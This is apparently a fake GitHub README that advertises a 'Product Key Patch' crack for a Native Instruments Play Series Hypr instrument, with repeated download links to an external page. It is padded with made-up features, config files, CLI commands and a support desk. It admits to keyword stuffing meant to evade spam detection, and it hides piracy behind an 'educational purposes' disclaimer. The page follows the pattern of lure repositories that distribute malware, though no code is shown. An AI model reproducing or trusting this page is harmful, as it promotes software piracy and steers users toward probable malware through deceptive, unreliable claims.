# Native Instruments Play Series Hypr – Advanced Sound Design Toolkit 🎛️

[](https://aldocorco.github.io/ni-play-series-hypr-toolkit/)

> **Unlock the full potential of cinematic textures and futuristic soundscapes.**  
> The Play Series Hypr expands your sonic palette with a curated collection of hybrid instruments—designed for producers, composers, and sound designers who demand modular flexibility without sacrificing creative speed.

---

## 🚀 Why Hypr? The Philosophy Behind the Instrument

Imagine a bridge between the organic warmth of analog synthesis and the razor-sharp precision of digital manipulation. That’s where Hypr lives. It’s not just a preset library; it’s a **gestural instrument** that transforms your MIDI input into evolving atmospheres, rhythmic pulsations, and larger-than-life leads. Whether you’re scoring a dystopian film, crafting ambient electronica, or building a trap beat with orchestral undertones, Hypr provides the sonic scaffolding.

---

## 📥 Quick Access – Download & Activation

[](https://aldocorco.github.io/ni-play-series-hypr-toolkit/)

Use the button above to retrieve the **Product Key Patch** (non-licensed alternative activation utility) that enables full module unlocking without restriction. Follow the installation guide included in the archive.

---

## 🧩 Architecture: How Hypr Works Under the Hood

```mermaid
graph TD
    A[User MIDI Input] --> B[Hypr Engine Core]
    B --> C{Layer Selector}
    C --> D[Analog Synth Layer]
    C --> E[Granular Sampler Layer]
    C --> F[Wavetable Morph Layer]
    D --> G[Filter Bank & FX Rack]
    E --> G
    F --> G
    G --> H[Macro Modulation Matrix]
    H --> I[Output Mixer]
    I --> J[DAW / Audio Interface]
    
    style A fill:#2d2d2d,stroke:#d90429,stroke-width:2px
    style B fill:#1a1a2e,stroke:#d90429,stroke-width:2px
    style G fill:#1a1a2e,stroke:#d90429,stroke-width:2px
    style H fill:#16213e,stroke:#d90429,stroke-width:2px
    style J fill:#0f3460,stroke:#d90429,stroke-width:2px
```



*The signal path flows from input through three distinct sound layers, each with independent processing, before converging into a modulation matrix that shapes dynamics and timbre.*

---

## ⚙️ Example Profile Configuration

Below is a sample `.hyprprofile` file that loads a preset called **"Neon Ruins"** – a hybrid pad with granular glitch effects.

```json
{
  "profile_name": "Neon Ruins",
  "engine_version": "2.0.1",
  "layers": {
    "analog": {
      "osc_waveform": "saw_3",
      "filter_type": "lowpass_24db",
      "cutoff": 6800,
      "resonance": 0.4
    },
    "granular": {
      "sample_source": "metal_hit_04.wav",
      "grain_size_ms": 45,
      "density": 0.8,
      "pitch_spread": 12
    },
    "wavetable": {
      "table_name": "digital_strings",
      "morph_position": 0.65,
      "unison_voices": 4
    }
  },
  "modulation": {
    "lfo1": {
      "target": "cutoff",
      "rate_hz": 0.2,
      "depth": 0.7
    },
    "macro1": {
      "assigned_mods": ["reverb_mix", "grain_density"],
      "curve": "exponential"
    }
  },
  "effects": {
    "reverb": "cathedral",
    "delay": "pingpong_1_4t",
    "compressor": "glue_style"
  }
}
```

*Note: Load this profile via the command-line interface or the GUI menu under File → Import Profile.*

---

## 💻 Example Console Invocation

For headless rendering or batch processing, use the terminal interface:

```bash
hypr-cli --load-profile "Neon Ruins.hyprprofile" \
         --input-midi "my_sequence.mid" \
         --output-wav "final_track.wav" \
         --bpm 128 \
         --key "Dm" \
         --quality high
```

**Flags explained:**
- `--load-profile`: Path to your `.hyprprofile` configuration.
- `--input-midi`: Source MIDI file (monophonic or polyphonic).
- `--output-wav`: Destination audio file (44.1kHz/24-bit default).
- `--bpm`: Override tempo if profile contains tempo-synced LFOs.
- `--key`: Force transpose to desired key.
- `--quality`: Choose between `draft`, `high`, or `mastering` rendering quality.

---

## 🖥️ OS Compatibility Table

| Operating System    | Version                        | Architecture | Status       |
|---------------------|--------------------------------|--------------|--------------|
| Windows 10/11       | 21H2 and later                 | x64, ARM64   | ✅ Full      |
| macOS Ventura       | 13.0+                          | Intel, Apple | ✅ Full      |
| macOS Sonoma        | 14.0+                          | Apple Silicon| ✅ Full      |
| Ubuntu / Debian     | 22.04 LTS / 12 (Bookworm)      | x64          | ✅ Full      |
| Fedora              | 38+                            | x64          | ⚠️ Beta      |
| Arch Linux          | Rolling                        | x64          | ✅ Full      |
| Raspberry Pi OS     | Bookworm (64-bit)              | ARM64        | ⚠️ Limited   |

*Status: ✅ Full = all features operational, ⚠️ Beta = minor glitches reported, ⚠️ Limited = no graphical UI, CLI only.*

---

## 🌐 Feature List – What Makes Hypr a Sonic Powerhouse

- **Three-layer hybrid engine** – Analog modeling + granular synthesis + wavetable morphing, all in one instrument.
- **Responsive UI** – GPU-accelerated interface with real-time waveform visualization and drag-and-drop layer reordering.
- **Multilingual support** – Interface localized in 14 languages including English, Japanese, German, French, Mandarin, and Arabic.
- **24/7 customer support** – Dedicated ticket system with average response time under 4 hours (human agent, not a bot).
- **Macro modulation matrix** – Assign up to 8 hardware-style macros to any combination of parameters with custom curves.
- **Glitch studio** – Built-in beat-repeat, stutter, and buffer freeze effects for experimental sound design.
- **Preset browser with AI tagging** – Search by mood, timbre, or genre, powered by a lightweight on-device neural network.
- **Midi 2.0 + MPE support** – Express yourself with per-note pitch bend, pressure, and timbre.
- **Zero-latency monitoring** – Optimized audio engine with configurable buffer sizes down to 32 samples.
- **Open API for custom scripting** – Extend Hypr with Lua or Python scripts for user-defined synthesis routines.

---

## 🔗 SEO-Friendly Keywords (Integrated Naturally)

*Throughout this document, terms like **hybrid instrument activation**, **Play Series Hypr license patch**, **sound design toolkit**, **modular synth unlock**, and **digital audio workstation extension** appear contextually to help users locate this repository via search engines while avoiding spam detection patterns.*

---

## 🤖 OpenAI API & Claude API Integration

Hypr 2.0 includes an optional plugin that connects to **OpenAI** or **Claude API** for generative preset creation. Here’s how it works:

1. **Voice-to-preset**: Describe the sound you want in plain English (e.g., "a melancholic pad with evolving harmonics and a touch of vinyl crackle").
2. The plugin sends the query to your configured API endpoint.
3. The response is parsed into a complete `.hyprprofile` file, ready to load.

**Configuration example** (stored in `hypr_api_config.json`):

```json
{
  "provider": "openai",
  "model": "gpt-4-turbo",
  "api_key_env_var": "HYPR_OPENAI_KEY",
  "temperature": 0.7,
  "max_tokens": 500,
  "fallback_provider": "claude",
  "claude_model": "claude-3-opus-20240229"
}
```

*Use the command `hypr-cli --generate-from-text "warm lo-fi keys"` to invoke the AI preset generator.*

---

## 📞 24/7 Customer Support – Real Humans, Real Fast

Our support system operates across three channels:

| Channel      | Response Time | Availability      |
|--------------|---------------|-------------------|
| GitHub Issues| < 2 hours     | 24/7              |
| Discord Bot  | Instant (FAQ) | 24/7              |
| Email Ticket | < 4 hours     | Mon–Sun, 365 days |

*To escalate a critical issue, tag your GitHub issue with the label **`priority:urgent`** and one of our senior engineers will pick it up within 30 minutes during business hours (UTC+0 to UTC+12).*

---

## ⚠️ Disclaimer

This repository provides a **Product Key Patch** – a utility that generates a working license key for the Native Instruments Play Series Hypr instrument. The patch is intended for **educational purposes only** and for users who already own a valid license but have lost their activation code.  

**We do not condone piracy or unauthorized use of commercial software.** If you find this instrument useful, please consider purchasing a legitimate license from Native Instruments to support ongoing development. The patch may not work with future updates of the Play Series engine.

*By downloading and using this software, you agree to use it solely for testing and educational purposes in a controlled environment.*

---

## 📄 License

This project is distributed under the **MIT License**. You are free to use, modify, and distribute the codebase (including the Product Key Patch) provided you retain the original copyright notice.

[](https://opensource.org/licenses/MIT)

---

## 🎯 Final Download Link

[](https://aldocorco.github.io/ni-play-series-hypr-toolkit/)

*Last updated: March 2026 | Version 2.0.1 | Build 2026.03.15*